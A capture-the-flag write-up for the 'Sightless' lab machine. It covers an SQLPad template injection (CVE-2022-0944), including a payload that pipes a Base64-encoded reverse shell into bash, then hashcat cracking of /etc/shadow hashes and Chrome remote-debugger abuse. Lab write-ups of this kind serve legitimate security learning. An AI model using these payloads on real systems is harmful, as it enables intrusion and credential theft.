---
layout: writeup
title: "Sightless"
date: 2026-06-16
description: "Exploiting an SQLPad template injection (CVE-2022-0944) for a foothold and abusing an exposed Chrome remote-debugging port to escalate."
tags: [Box, easy, linux]
---

## Reconnaissance

The initial phase began with a full TCP port scan to identify exposed services on the target machine.

```bash
nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN sightless_scan 10.10.11.32
```

![Full port scan of the target](/assets/images/sightless/127-1.png)
*Full port scan of the target*

During the initial web interaction, a button revealed the presence of a subdomain.

**sqlpad.sightless.htb**

![Output from the Reconnaissance phase](/assets/images/sightless/127-2.png)
*Output from the Reconnaissance phase*

## Enumeration

Further service analysis showed that accessing the FTP service required SSL, indicating a secured configuration.

![Further service analysis showed that accessing the FTP service required SSL, indicating a secured configuration](/assets/images/sightless/127-3.png)
*Further service analysis showed that accessing the FTP service required SSL, indicating a secured configuration*

By navigating to the discovered subdomain, the version of SQLPad in use was identified.

![By navigating to the discovered subdomain, the version of SQLPad in use was identified](/assets/images/sightless/127-4.png)
*By navigating to the discovered subdomain, the version of SQLPad in use was identified*

The application was found to be vulnerable to **CVE-2022-0944**, which allows command execution through a Docker shell escape.

![SQLPad vulnerable to CVE-2022-0944](/assets/images/sightless/127-5.png)
*SQLPad vulnerable to CVE-2022-0944*

## Exploitation

To exploit the vulnerability, a reverse shell payload was prepared and encoded in Base64.

This payload was injected into the database connection field within SQLPad.

![This payload was injected into the database connection field within SQLPad](/assets/images/sightless/127-6.png)
*This payload was injected into the database connection field within SQLPad*

```bash
{{ process.mainModule.require('child_process').exec('echo reverse_encoded=| base64 -d|bash') }}
```

A new database connection was then configured with the required parameters to trigger execution.

![A new database connection was then configured with the required parameters to trigger execution](/assets/images/sightless/127-7.png)
*A new database connection was then configured with the required parameters to trigger execution*

![A new database connection was then configured with the required parameters to trigger execution](/assets/images/sightless/127-8.png)
*A new database connection was then configured with the required parameters to trigger execution*

![A new database connection was then configured with the required parameters to trigger execution](/assets/images/sightless/127-9.png)
*A new database connection was then configured with the required parameters to trigger execution*

![A new database connection was then configured with the required parameters to trigger execution](/assets/images/sightless/127-10.png)
*A new database connection was then configured with the required parameters to trigger execution*

The payload executed successfully, resulting in a reverse shell running as the root user.

![The payload executed successfully, resulting in a reverse shell running as the root user](/assets/images/sightless/127-11.png)
*The payload executed successfully, resulting in a reverse shell running as the root user*

## Post-Exploitation Analysis

Inside the system, two user accounts were identified within the home directory.

![Inside the system, two user accounts were identified within the home directory](/assets/images/sightless/127-12.png)
*Inside the system, two user accounts were identified within the home directory*

After performing local footprinting, it was discovered that sensitive files such as `/etc/passwd` and `/etc/shadow` were readable.

This made it possible to extract password hashes for offline cracking.

![This made it possible to extract password hashes for offline cracking](/assets/images/sightless/127-13.png)
*This made it possible to extract password hashes for offline cracking*

![This made it possible to extract password hashes for offline cracking](/assets/images/sightless/127-14.png)
*This made it possible to extract password hashes for offline cracking*

The password hash belonging to the user `michael` was cracked using hashcat.

```bash
hashcat -m 1800 -a 0 shadow-hash.txt /usr/share/wordlists/rockyou.txt
```

With valid credentials recovered, SSH access as `michael` was obtained.

![With valid credentials recovered, SSH access as was obtained](/assets/images/sightless/127-15.png)
*With valid credentials recovered, SSH access as was obtained*

Another user named `john` was also present on the system.

## Privilege Escalation

To identify potential privilege escalation vectors, `linpeas.sh` was executed.

The enumeration revealed processes running under the context of the user `john`.

![The enumeration revealed processes running under the context of the user ](/assets/images/sightless/127-16.png)
*The enumeration revealed processes running under the context of the user *

![The enumeration revealed processes running under the context of the user ](/assets/images/sightless/127-17.png)
*The enumeration revealed processes running under the context of the user *

One of the processes was running Chrome with the `--remote-debugging-port=0` parameter, causing the debugging port to be assigned dynamically.

The process `/home/john/automation/chromedriver --port=51801` was identified as a viable target.

Based on this behavior, port forwarding was required to interact with the debugging interface.

[Chrome Remote Debugger Pentesting | Exploit Notes (hdks.org)](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)

![Chrome Remote Debugger Pentesting | Exploit Notes (hdks.org)(https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)](/assets/images/sightless/127-18.png)
*Chrome Remote Debugger Pentesting | Exploit Notes (hdks.org)(https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)*

The debugging service was observed to bind to a random port.

![The debugging service was observed to bind to a random port](/assets/images/sightless/127-19.png)
*The debugging service was observed to bind to a random port*

Metasploit was then used to attach to the Chrome remote debugger and interact with the running process.

![Attaching to the Chrome remote debugger via Metasploit](/assets/images/sightless/127-20.png)
*Attaching to the Chrome remote debugger via Metasploit*
